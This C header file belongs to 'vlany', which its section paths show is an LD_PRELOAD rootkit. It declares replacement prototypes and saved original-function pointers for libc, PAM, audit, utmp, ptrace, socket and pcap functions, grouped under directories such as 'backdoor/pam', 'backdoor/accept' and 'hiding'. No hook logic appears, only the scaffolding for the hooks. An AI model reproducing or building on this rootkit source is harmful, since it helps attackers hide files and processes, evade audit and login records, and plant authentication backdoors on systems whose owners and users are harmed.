/*
 *    __                  _   _                               _        _                         
 *   / _|                | | (_)                             | |      | |                        
 *  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
 *  |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
 *  | | | |_| | | | | (__| |_| | (_) | | | | | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
 *  |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
 *                                           | |                            __/ | |              
 *                                           |_|                           |___/|_|              
 *
 *    This file contains all of the required function prototypes for vlany. All created prototypes are
 *    modified by vlany. The location of each modification can be found above each section of prototypes.
 *    Example:
 *        // symbols/rename/*
 *        int rename(const char *oldpath, const char *newpath);
 *        int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath);
 *        int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags);
 *    So the rename*() functions hooked by vlany are located in "./symbols/rename/".
 *    
 *    -Wno-comment (thanks gcc for making my life an unnecessary misery)
 *    The locations of the man pages for every function are located in vlany.c.
 */

// symbols/hiding/libdl/*
void *dlsym(void *handle, const char *symbol);
int dlinfo(void *handle, int request, void *p);
int dladdr(const void *addr, Dl_info *info);

// symbols/rename/*
int rename(const char *oldpath, const char *newpath);
int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath);
int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags);

// symbols/read/*
char *fgets(char *s, int size, FILE *stream);
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);

// symbols/flags/*
int fgetflags(const char *name, unsigned long *flags);
int fsetflags(const char *name, unsigned long flags);

// symbols/permissions/*
int chmod(const char *path, mode_t mode);
int chown(const char *path, uid_t owner, gid_t group);
int fchmod(int fd, mode_t mode);
int fchown(int fd, uid_t owner, gid_t group);
int fchownat(int dirfd, const char *pathname, uid_t owner, gid_t group, int flags);
int lchown(const char *path, uid_t owner, gid_t group);

// symbols/stat/*
int stat(const char *pathname, struct stat *buf);
int stat64(const char *pathname, struct stat64 *buf);
int fstat(int fd, struct stat *buf);
int fstat64(int fd, struct stat64 *buf);
int lstat(const char *pathname, struct stat *buf);
int lstat64(const char *pathname, struct stat64 *buf);
int __lxstat(int version, const char *pathname, struct stat *buf);
int __lxstat64(int version, const char *pathname, struct stat64 *buf);
int __fxstat(int ver, int fd, struct stat *buf);
int __fxstat64(int ver, int fd, struct stat64 *buf);
int __xstat(int version, const char *pathname, struct stat *buf);
int __xstat64(int version, const char *pathname, struct stat64 *buf);

// symbols/xattr/*
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
int lsetxattr(const char *path, const char *name, const void *value, size_t size, int flags);
int fsetxattr(int fd, const char *name, const void *value, size_t size, int flags);
ssize_t getxattr(const char *path, const char *name, void *value, size_t size);
ssize_t lgetxattr(const char *path, const char *name, void *value, size_t size);
ssize_t fgetxattr(int fd, const char *name, void *value, size_t size);
ssize_t listxattr(const char *path, char *list, size_t size);
ssize_t llistxattr(const char *path, char *list, size_t size);
ssize_t flistxattr(int fd, char *list, size_t size);
int removexattr(const char *path, const char *name);
int lremovexattr(const char *path, const char *name);
int fremovexattr(int fd, const char *name);

// symbols/hiding/debug/*
long ptrace(void *request, pid_t pid, void *addr, void *data);

// symbols/write/*
int creat(const char *pathname, mode_t mode);
size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream);
size_t fwrite_unlocked(const void *ptr, size_t size, size_t n, FILE *stream);
int fputs_unlocked(const char *s, FILE *stream);

// symbols/exec/*
int execve(const char *filename, char *const argv[], char *const envp[]);
int execvp(const char *filename, char *const argv[]);

// symbols/links/*
int link(const char *oldpath, const char *newpath);
int linkat(int oldfirfd, const char *oldpath, int newdirfd, const char *newpath, int flags);
int unlink(const char *pathname);
int unlinkat(int dirfd, const char *pathname, int flags);
int symlink(const char *target, const char *linkat);
int symlinkat(const char *target, int newdirfd, const char *linkat);

// symbols/dir/*
int mkdir(const char *pathname, mode_t mode);
int mkdirat(int dirfd, const char *pathname, mode_t mode);
int rmdir(const char *pathname);
DIR *opendir(const char *name);
DIR *opendir64(const char *name);
DIR *fdopendir(int fd);
struct dirent *readdir(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp);
int chdir(const char *path);
int fchdir(int fd);

// symbols/open/*
int access(const char *path, int amode);
int open(const char *pathname, int flags, mode_t mode);
int open64(const char *pathname, int flags, mode_t mode);
FILE *fopen(const char *path, const char *mode);
FILE *fopen64(const char *path, const char *mode);

// symbols/audit/*
int audit_log_acct_message(int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result);
int audit_log_user_message(int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result);
int audit_send(int fd, int type, const void *data, unsigned int size);

// symbols/utmp/*
struct utmp *getutent(void);
struct utmpx *getutxent(void);
struct utmp *getutid(const struct utmp *ut);
struct utmpx *getutxid(const struct utmpx *utx);
struct utmp *pututline(const struct utmp *ut);
struct utmpx *pututxline(const struct utmpx *utx);
void getutmp(const struct utmpx *utx, struct utmp *ut);
void getutmpx(const struct utmp *ut, struct utmpx *utx);
void updwtmp(const char *wfile, const struct utmp *ut);
void updwtmpx(const char *wfilex, const struct utmpx *utx);
void login(const struct utmp *ut);

// symbols/hiding/socket.c
int socket(int domain, int type, int protocol);

// symbols/pcap/*
int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user);

// symbols/backdoor/accept/accept.c
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

// symbols/backdoor/pam/*
int pam_authenticate(pam_handle_t *pamh, int flags);
int pam_open_session(pam_handle_t *pamh, int flags);
int pam_acct_mgmt(pam_handle_t *pamh, int flags);

// symbols/gid/*
int setgid(gid_t gid);
int setegid(gid_t egid);
int setregid(gid_t rgid, gid_t egid);
int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

// symbols/passwd/*
struct passwd *getpwnam(const char *name);
struct passwd *getpwuid(uid_t uid);
struct spwd *getspnam(const char *name);
struct passwd *getpwent(void);
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result);

/*
 *                  _          __    __                  _   _                               _        _                         
 *                 | |        / _|  / _|                | | (_)                             | |      | |                        
 *    ___ _ __   __| |   ___ | |_  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
 *   / _ \ '_ \ / _` |  / _ \|  _| |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
 *  |  __/ | | | (_| | | (_) | |   | | | |_| | | | | (__| |_| | (_) | | | | | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
 *   \___|_| |_|\__,_|  \___/|_|   |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
 *                                                                          | |                            __/ | |              
 *                                                                          |_|                           |___/|_|              
 */



/*
 *         _     _    __                  _   _                               _        _                         
 *        | |   | |  / _|                | | (_)                             | |      | |                        
 *    ___ | | __| | | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
 *   / _ \| |/ _` | |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
 *  | (_) | | (_| | | | | |_| | | | | (__| |_| | (_) | | | | | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
 *   \___/|_|\__,_| |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
 *                                                           | |                            __/ | |              
 *                                                           |_|                           |___/|_|              
 *
 *  Below all I'm doing is creating prototypes of symbols by using typeof() so that I can reference the old library
 *  functions in the new functions that I'm hooking. Using typeof() literally just saves me time. It's for me. Not you.
 */

typeof(dlsym) *old_dlsym;
typeof(dlinfo) *old_dlinfo;
typeof(dladdr) *old_dladdr;

typeof(rename) *old_rename;
typeof(renameat) *old_renameat;
typeof(renameat2) *old_renameat2;

typeof(fgets) *old_fgets;
typeof(fread) *old_fread;

typeof(fgetflags) *old_fgetflags;
typeof(fsetflags) *old_fsetflags;

typeof(chmod) *old_chmod;
typeof(chown) *old_chown;
typeof(fchmod) *old_fchmod;
typeof(fchown) *old_fchown;
typeof(fchownat) *old_fchownat;
typeof(lchown) *old_lchown;

typeof(stat) *old_stat;
typeof(stat64) *old_stat64;
typeof(fstat) *old_fstat;
typeof(fstat64) *old_fstat64;
typeof(lstat) *old_lstat;
typeof(lstat64) *old_lstat64;
typeof(__lxstat) *old_lxstat;
typeof(__lxstat64) *old_lxstat64;
typeof(__fxstat) *old_fxstat;
typeof(__fxstat64) *old_fxstat64;
typeof(__xstat) *old_xstat;
typeof(__xstat64) *old_xstat64;

typeof(setxattr) *old_setxattr;
typeof(lsetxattr) *old_lsetxattr;
typeof(fsetxattr) *old_fsetxattr;
typeof(getxattr) *old_getxattr;
typeof(lgetxattr) *old_lgetxattr;
typeof(fgetxattr) *old_fgetxattr;
typeof(listxattr) *old_listxattr;
typeof(llistxattr) *old_llistxattr;
typeof(flistxattr) *old_flistxattr;
typeof(removexattr) *old_removexattr;
typeof(lremovexattr) *old_lremovexattr;
typeof(fremovexattr) *old_fremovexattr;

typeof(ptrace) *old_ptrace;

typeof(creat) *old_creat;
typeof(fwrite) *old_fwrite;
typeof(fwrite_unlocked) *old_fwrite_unlocked;
typeof(fputs_unlocked) *old_fputs_unlocked;

typeof(execve) *old_execve;
typeof(execvp) *old_execvp;

typeof(link) *old_link;
typeof(linkat) *old_linkat;
typeof(unlink) *old_unlink;
typeof(unlinkat) *old_unlinkat;
typeof(symlink) *old_symlink;
typeof(symlinkat) *old_symlinkat;

typeof(mkdir) *old_mkdir;
typeof(mkdirat) *old_mkdirat;
typeof(rmdir) *old_rmdir;
typeof(opendir) *old_opendir;
typeof(opendir64) *old_opendir64;
typeof(fdopendir) *old_fdopendir;
typeof(readdir) *old_readdir;
typeof(readdir64) *old_readdir64;
typeof(chdir) *old_chdir;
typeof(fchdir) *old_fchdir;

typeof(access) *old_access;
typeof(open) *old_open;
typeof(open64) *old_open64;
typeof(fopen) *old_fopen;
typeof(fopen64) *old_fopen64;

typeof(audit_log_acct_message) *old_alam;
typeof(audit_log_user_message) *old_alum;
typeof(audit_send) *old_audit_send;

typeof(getutent) *old_getutent;
typeof(getutxent) *old_getutxent;
typeof(getutid) *old_getutid;
typeof(getutxid) *old_getutxid;
typeof(pututline) *old_pututline;
typeof(pututxline) *old_pututxline;
typeof(getutmp) *old_getutmp;
typeof(getutmpx) *old_getutmpx;
typeof(updwtmp) *old_updwtmp;
typeof(updwtmpx) *old_updwtmpx;
typeof(login) *old_login;

typeof(socket) *old_socket;

typeof(pcap_loop) *old_pcap_loop;
void (*old_callback)(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

typeof(accept) *old_accept;

typeof(pam_authenticate) *old_pam_authenticate;
typeof(pam_open_session) *old_pam_open_session;
typeof(pam_acct_mgmt) *old_pam_acct_mgmt;

typeof(setgid) *old_setgid;
typeof(setegid) *old_setegid;
typeof(setregid) *old_setregid;
typeof(setresgid) *old_setresgid;

typeof(getpwnam) *old_getpwnam;
typeof(getpwuid) *old_getpwuid;
typeof(getspnam) *old_getspnam;
typeof(getpwent) *old_getpwent;
typeof(getpwnam_r) *old_getpwnam_r;

/*
 *                  _          __         _     _   _ _ _             __                  _   _                               _        _                         
 *                 | |        / _|       | |   | | | (_) |           / _|                | | (_)                             | |      | |                        
 *    ___ _ __   __| |   ___ | |_    ___ | | __| | | |_| |__   ___  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
 *   / _ \ '_ \ / _` |  / _ \|  _|  / _ \| |/ _` | | | | '_ \ / __| |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
 *  |  __/ | | | (_| | | (_) | |   | (_) | | (_| | | | | |_) | (__  | | | |_| | | | | (__| |_| | (_) | | | | | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
 *   \___|_| |_|\__,_|  \___/|_|    \___/|_|\__,_| |_|_|_.__/ \___| |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
 *                                                                                                           | |                            __/ | |              
 *                                                                                                           |_|                           |___/|_|              
 */
